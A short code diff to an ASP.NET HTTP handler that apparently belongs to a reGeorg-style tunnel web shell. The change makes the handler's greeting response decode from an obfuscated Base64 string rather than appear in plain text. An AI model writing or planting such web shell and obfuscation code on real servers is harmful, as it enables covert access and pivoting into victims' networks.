@@ -247,7 +247,7 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
             }
             context.Response.Write(StrTr(Convert.ToBase64String(blv_encode(rinfo)), en, de));
         } else {
-            context.Response.Write(GeorgHello);
+            context.Response.Write(Encoding.Default.GetString(Convert.FromBase64String(StrTr(GeorgHello, de, en))));
         }
     }
 
